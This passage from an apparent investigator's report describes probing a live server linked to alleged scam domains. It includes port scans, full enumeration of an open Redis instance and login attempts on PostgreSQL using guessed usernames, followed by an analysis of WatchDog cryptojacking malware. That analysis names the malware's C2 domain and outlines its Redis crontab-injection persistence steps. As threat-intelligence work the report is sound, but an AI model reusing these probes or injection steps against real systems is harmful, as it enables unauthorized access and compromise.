- `redis-info` NSE script confirmed Redis 7.4.7, standalone mode, 4 keys in db0

### PostgreSQL: Locked Down

`psql -h 13.220.193.170 -w` tested 8 common usernames: `postgres`, `admin`, `root`, `hestiacp`, `hestia`, `epicfunnels`, `olivimails`, `noodledit`. All returned `fe_sendauth: no password supplied`. Unlike Redis, PostgreSQL requires authentication. The data behind it (likely the backend for CustomerTestConnect / MyAmericanPrizes) remains inaccessible without credentials.

### Node.js: Dead but Leaky

The crashed Node.js app on port 3000 reveals directory structure through HTTP 308 redirects:
- `/node_modules/`, `/dist/`, `/build/`, `/src/`, `/public/` — all return 308 (Moved Permanently)
- This confirms the filesystem paths exist on the server
- Every actual endpoint returns HTTP 500 — the application is completely non-functional
- No git exposure (`.git/HEAD` returns 500, not a git object)
- No source maps accessible

### GCS Inventory: 747 Objects Confirmed

Full XML bucket listing with pagination confirms the prior count:
- **b.noodledit.com**: 747 objects, 122.41 MB
- Categories: 533 promotions, 159 pages, 55 themes
- Date range: 2024-10-22 to 2026-04-08
- No sensitive files (.env, .sql, .bak, credentials) found in object keys
- The bucket inventory is consistent with the prior probe — no new uploads between probes

### Hestia Control Panel: IP Whitelisted

The Hestia API at `https://13.220.193.170:8083` returns `Error: IP is not allowed to connect with API` for all API endpoints. The login page is still accessible (serves the v1.9.4 login form), but the REST API is restricted to whitelisted IPs. This is the one security measure the operator actually configured correctly.

### Updated Infrastructure Diagram

```
┌─ MANAGEMENT LAYER ──────────────────────────────────────────────┐
│  Hestia Control Panel v1.9.4 (:8083)                            │
│  FQDN: fqdn.olivimails.com                                      │
│  Manages: nginx, Dovecot, PostgreSQL, Node.js, Redis             │
│  Login page exposed, API IP-whitelisted                          │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ AWS EC2 (13.220.193.170) — 15 OPEN PORTS ────────────────────┐
│  :21  FTP (discovered via deep probe)                            │
│  :22  SSH (OpenSSH 9.2p1)                                        │
│  :53  DNS (discovered via deep probe — running nameserver)       │
│  :80  nginx ("Success!" + virtual hosts, TRACE enabled)          │
│  :110 POP3 (discovered via deep probe — Dovecot)                 │
│  :143 IMAP (Dovecot)                                             │
│  :443 HTTPS (cert expired Jan 2026)                              │
│  :465 SMTPS (Exim, leaks internal hostname)                      │
│  :587 SMTP Submission (leaks ip-172-26-15-175.ec2.internal)      │
│  :993 IMAPS (Dovecot, AUTH=PLAIN, cert=fqdn.olivimails.com)     │
│  :995 POP3S (discovered via deep probe — Dovecot over SSL)       │
│  :3000 Node.js (DEAD — HTTP 500, dirs leak via 308)              │
│  :5432 PostgreSQL (EXPOSED, requires password)                   │
│  :6379 Redis 7.4.7 (NO AUTH — ACTIVE WARZONE, 24 attacker IPs)  │
│  :8083 Hestia Control Panel (login exposed, API whitelisted)     │
│                                                                  │
│  Redis stats: 218K connections, 337 FLUSHALL, 4355 SLAVEOF,     │
│  1455 EVAL (Lua RCE), crontab injection, 24 threat actors        │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ DOMAINS (6+) ─────────────────────────────────────────────────┐
│  olivimails.com ──── original server hostname (EXPIRED)          │
│  epicfunnels.net ─── scam funnels + email (CF: cheryl/logan)     │
│  noodledit.com ───── asset CDN on GCS (CF: cass/felicity)        │
│  mydailysurge.com ── SEO content farm (CF: cass/felicity)        │
│  phef6trk.com ────── CPA tracker (SINKHOLED at 10.0.0.1)        │
│  myamericanprizes.com ─ sweepstakes brand (M365, ActiveProspect) │
│  rewardzinga.com ──── subscription scam (BBB d/b/a)             │
│  + snagalot.com, myamericanprizes1.com, easyscanamoe.com        │
└─────────────────────────────────────────────────────────────────┘
     │
     ▼
┌─ THIRD-PARTY INTEGRATIONS ──────────────────────────────────────┐
│  Google Search Console ── domain verified                        │
│  Microsoft 365 ────────── MS=ms66511106 (deleted) + ms46839871   │
│  ActiveProspect ───────── TCPA consent verification              │
│  Jornaya (=ActiveProspect) ── lead intelligence / TCPA consent   │
│  SCA Promotions ───────── AMOE sweepstakes wrapper               │
│  Zendesk ──────────────── customer "support"                     │
│  Lovable AI ───────────── scam page generator                    │
│  Webflow ──────────────── SEO blog host                          │
│  Ve Global ────────────── retargeting platform (in GTM)          │
└─────────────────────────────────────────────────────────────────┘
```

### Deep Probe Artifacts

All saved in `artifacts/deep-probe-2026-04-08/`:

- `redis-full.json` — Complete Redis enumeration: INFO all, CONFIG GET *, CLIENT LIST, SLOWLOG, MEMORY STATS, ACL LIST, MODULE LIST, CLUSTER INFO, key inventory with type/TTL/encoding/size for all 4 keys across all 16 databases
- `postgresql-discovery.json` — Connection attempts for 8 usernames, all returning fe_sendauth
- `nmap-comprehensive.json` — Targeted service scan (-sV -sC -O), full 65535 TCP SYN sweep (-sS -p-), redis-info NSE, HTTP NSE scripts, all raw output + XML
- `nodejs-deep.json` — Git exposure test, source map checks, 50+ path enumeration, error probing, header analysis
- `gcs-inventory.json` — Full XML bucket listing for both b.noodledit.com (747 objects) and sassets.noodledit.com (28 objects), Python-parsed with key/size/date/etag for every object, sensitive file detection, metadata extraction
- `hestia-panel.json` — Login page analysis, API endpoint tests (all IP-rejected), directory enumeration, SSL cert details

## Follow-up Probes (2026-04-09)

New port investigation, threat actor attribution, and malware identification. Raw data in `artifacts/new-ports-2026-04-09/`.

### FTP (Port 21): Locked

- **Banner**: `220 Welcome! Please note that all activity is logged.`
- **Anonymous login**: REJECTED (`530 Login incorrect`)
- **Features**: UTF8, EPRT, EPSV, MDTM, PASV, **PBSZ, PROT** (FTP-TLS capable), REST STREAM, SIZE, TVFS
- **Verdict**: vsftpd-style server, properly configured — no anonymous access. PBSZ/PROT indicate FTPS capability. The "all activity is logged" banner is either genuine or cargo-cult security. Either way, no data accessible without credentials.

### DNS (Port 53): Recursive Resolver, Not Authoritative

Port 53 is **not** an authoritative nameserver — it's a **recursive resolver** (flags: `qr rd ra`). This is Hestia Control Panel's built-in BIND running as a local DNS cache.

- **Zone transfers**: Failed (expected — not a zone authority)
- **Resolves epicfunnels.net**: Via Cloudflare (SOA: cheryl.ns.cloudflare.com) — normal public resolution
- **olivimails.com**: NXDOMAIN everywhere (domain expired, confirmed)
- **Subdomain resolution**: Only jessica, webmail, and mail still live (all Cloudflare IPs 172.67.192.166 / 104.21.11.211). jenny, kylie, app, demo, admin, ftp, dns — all NXDOMAIN.
- **version.bind**: NXDOMAIN (version hidden)
- **Verdict**: No hidden zones to dump, no internal records leaked. Just a local resolver for the server's own DNS needs. Not an intel goldmine.

### POP3 (Ports 110/995): Dovecot, As Expected

- **Banner**: `+OK Mail Delivery Agent` (same as IMAP)
- **Port 110**: STARTTLS available, SASL PLAIN + LOGIN auth
- **Port 995**: Already TLS-wrapped, same auth methods
- **Capabilities**: TOP, UIDL, PIPELINING, RESP-CODES, AUTH-RESP-CODE
- **Verdict**: Standard Dovecot POP3 access alongside IMAP. No additional intel — confirms the complete email stack (SMTP/IMAP/POP3 on Exim+Dovecot).

### Threat Actor Attribution (Redis Attackers)

Full reverse DNS + whois for all 23 external IPs from the Redis slowlog. The **overwhelming majority are Chinese cloud infrastructure** — Baidu Cloud, Alibaba Cloud, Tencent Cloud, ChinaNet, and ByteDance's Volcano Engine.

| IP | Provider | ASN | Country | Attack Type | Threat Level |
|----|----------|-----|---------|-------------|-------------|
| **120.48.43.118** | **Baidu Cloud** | AS38365 | CN | **CONFIG SET dir /var/spool/cron/crontabs** — crontab injection | **HIGH** |
| **47.112.215.87** | **Alibaba Cloud** | APNIC range | CN | **EVAL package.loadlib** — Lua RCE sandbox escape | **HIGH** |
| **27.185.41.158** | **ChinaNet Hebei** | ChinaTelecom | CN | **CONFIG SET dir /etc/cron.d** — cron.d injection | **HIGH** |
| **200.188.48.146** | Unknown ISP | — | MX | CONFIG SET stop-writes-on-bgsave-error no — RDB attack prep | MEDIUM |
| 180.76.114.78 | Baidu Cloud | AS38365 | CN | FLUSHALL + SAVE + CONFIG SET (repeated sessions) | MEDIUM |
| 180.76.52.82 | Baidu Cloud | AS38365 | CN | FLUSHALL + SAVE + COMMAND | MEDIUM |
| 180.76.58.237 | Baidu Cloud | AS38365 | CN | FLUSHALL + SAVE | MEDIUM |
| 120.48.35.163 | Baidu Cloud | AS38365 | CN | FLUSHALL + SAVE | MEDIUM |
| 120.48.174.141 | Baidu Cloud | AS38365 | CN | SAVE | LOW |
| 183.6.4.31 | ChinaNet Guangdong | ChinaTelecom | CN | FLUSHALL + SAVE + COMMAND | MEDIUM |
| 183.56.243.176 | ChinaNet Guangdong | ChinaTelecom | CN | FLUSHALL + SAVE + COMMAND | MEDIUM |
| 183.56.219.190 | ChinaNet Guangdong | ChinaTelecom | CN | FLUSHALL + SAVE + COMMAND | MEDIUM |
| 14.18.118.84 | ChinaNet Guangdong | ChinaTelecom | CN | FLUSHALL + SAVE | MEDIUM |
| 113.209.196.69 | Beijing Primezone | — | CN | FLUSHALL + SAVE | MEDIUM |
| 116.153.32.50 | China Unicom | AS4837 | CN | FLUSHALL + SAVE | MEDIUM |
| 81.71.51.170 | Tencent Cloud | — | CN | FLUSHALL + SAVE | MEDIUM |
| 47.94.213.192 | Alibaba Cloud | APNIC range | CN | SAVE | LOW |
| 118.196.34.36 | ByteDance Volcano Engine | AS137718 | CN | COMMAND recon | LOW |
| 111.90.158.78 | **Shinjiru Technology** | AS19324 | MY | FLUSHALL | MEDIUM |
| 198.74.62.88 | Linode / Akamai | — | US | FLUSHALL + SAVE | MEDIUM |
| 194.163.170.77 | Contabo GmbH (vmi3002568.contaboserver.net) | AS51167 | DE | SAVE + COMMAND DOCS | LOW |
| 3.132.26.232 | AWS (scan.visionheight.com) | — | US | INFO recon | SCANNER |
| 130.131.161.238 | Stretchoid (azpdcgeh5752.stretchoid.com) | — | NL | INFO recon | SCANNER |

**Country breakdown**: China 17 (74%), USA 2, Germany 1, Malaysia 1, Mexico 1, Netherlands 1.

**Provider clusters**:
- **Baidu Cloud** (6 IPs in 120.48.0.0/16 and 180.76.0.0/16): The largest single cluster. Includes the crontab injector. Abuse contact: huxin05@baidu.com.
- **ChinaNet/China Telecom** (5 IPs across Guangdong + Hebei): Residential/business IPs. Includes the cron.d injector. Abuse: anti-spam@chinatelecom.cn.
- **Alibaba Cloud** (2 IPs in 47.x APNIC range): Includes the Lua RCE actor.
- **Shinjiru** (Malaysia): Known bulletproof hosting provider popular with cybercriminals.
- **Stretchoid** + **scan.visionheight.com**: Known internet measurement scanners — not threat actors, just cataloging open Redis instances.

**Key finding**: All three HIGH-threat actors (crontab injection, Lua RCE, cron.d injection) are on **Chinese cloud infrastructure**. The Baidu Cloud IPs show coordinated behavior across multiple sessions spanning weeks — likely a single botnet fleet operating across 6 VMs in the same ASN.

### Redis Malware: WatchDog Cryptojacking Campaign

The 4 `backup1`-`backup4` keys containing crontab payloads that phone home to `oracle.zzhreceive.top` are **WatchDog** — a long-running cryptojacking operation first exposed by **Palo Alto Unit 42** in February 2021, with additional reporting by CrowdStrike, Cado Labs (now Darktrace), Tropico Security, Fortinet, and Securonix.

**Identification** — every indicator matches documented WatchDog IOCs:

| Indicator | WatchDog Match |
|---|---|
| `oracle.zzhreceive.top` | Confirmed C2 domain (Unit 42, CrowdStrike, Cado Labs, Tropico) |
| `/b2f628/` URL path | Campaign signature (appears across all reports since late 2020) |
| `/b2f628fff19fda999999999/` | Extended variant path (CrowdStrike, Unit 42 updated report) |
| `b.sh` script name | Redis propagation script (Securonix IOC list, Tropico) |
| `cd1` = obfuscated `curl` | WatchDog evasion technique (CrowdStrike) |
| `wd1` = obfuscated `wget` | Renames wget to block competing malware (CrowdStrike, Tropico) |
| `backup1`-`backup4` key names | Standard WatchDog Redis crontab injection pattern (Tropico honeypot) |
| Crontab intervals `*/2` through `*/5` | WatchDog redundancy pattern — staggered download methods |

**WatchDog group profile**:
- **Active since**: January 27, 2019 — one of the longest-running cryptojacking operations documented
- **Goal**: Monero (XMR) mining via XMRig
- **Scale**: 476+ simultaneously compromised systems, 209 XMR (~$32,056 USD) documented profit
- **Tooling**: GoLang binaries (`networkmanager`, `phpguard`, `phpupdate`), bash scripts, 33 unique exploits
- **Targets**: Exposed Redis, Docker Engine API, PostgreSQL, and 30+ other services

**TeamTNT connection**: The `zzhreceive` naming was originally TeamTNT (`zzhrecieve.anondns.net` — note the misspelling). Both domains resolved to `199.19.226.117`. Unit 42 initially attributed to TeamTNT (June 2021) but corrected to WatchDog (October 2021) — WatchDog was using stolen/copied TeamTNT tooling, including logos and the `hilde@teamtnt.red` email, but lacks TeamTNT's more advanced Kubernetes exploitation.

**Attack chain**:
1. **Initial access**: Exploit unauthenticated Redis (port 6379) or Docker API (port 2375)
2. **Persistence**: Write `backup1`-`backup4` crontab keys, then `CONFIG SET dir /var/spool/cron/crontabs/` + `CONFIG SET dbfilename root` + `SAVE`
3. **Stage 1** (`cronb.sh`/`b.sh`): Check infection status, enumerate processes, fetch next payload
4. **Stage 2** (`ar.sh`): Process hiding via `ps` hijacking, timestomping, remove Alibaba Cloud Agent
5. **Stage 3**: XMRig miner with systemd persistence
6. **Stage 4** (`c.sh` + `d.sh`): Lateral movement — `c.sh` propagates via Redis (disables SELinux, configures iptables), `d.sh` targets Docker endpoints

**Why it failed here**: Redis runs in Docker (PID 1, `dir=/data`). The crontab injection cannot reach the host filesystem from inside the container. The malware keys persist because WatchDog keeps re-injecting them after each FLUSHALL wipe by competing botnets, but the mining payload never executes.

**C2 status**: `oracle.zzhreceive.top` is dead (NXDOMAIN). Previously resolved to `199.19.226.117`. No Wayback Machine snapshots exist. The `.top` TLD (ZDNS/China) is ranked by Unit 42 in the top 10 TLDs for malicious domain proportion.

**Wider context** (Tropico honeypot research): WatchDog is one of **5 identified groups** actively attacking exposed Redis — alongside Kinsing, Cleanfda, TA-NATALSTATUS, and RedisRaider. 87% of Redis attacks use cron-based persistence. 82.5% of attacking IPs come from Chinese infrastructure. ~60,000 of 360,000 publicly accessible Redis servers worldwide have no password.

**Assessment**: The WatchDog malware is **not related to the scam operators** (Moxxi Digital). It is opportunistic cryptojacking by a well-known botnet. The scam operator's Redis was discovered by internet-wide scanners and became a warzone entirely independent of the scam operation.

Full analysis with SHA256 hashes, Monero wallet addresses, and source references: `artifacts/new-ports-2026-04-09/watchdog-malware-analysis.md`

### Follow-up Probe Artifacts

All saved in `artifacts/new-ports-2026-04-09/`:

- `ftp-probe.json` — FTP anonymous login attempt, banner, features list
- `dns-probe.json` — DNS recursive resolver analysis, zone transfer attempts, subdomain resolution, version query
- `pop3-probe.json` — POP3/POP3S banner and capabilities
- `threat-actor-attribution.json` — Full reverse DNS + whois for all 23 external Redis attacker IPs with ASN, org, country, netname, CIDR, abuse contacts
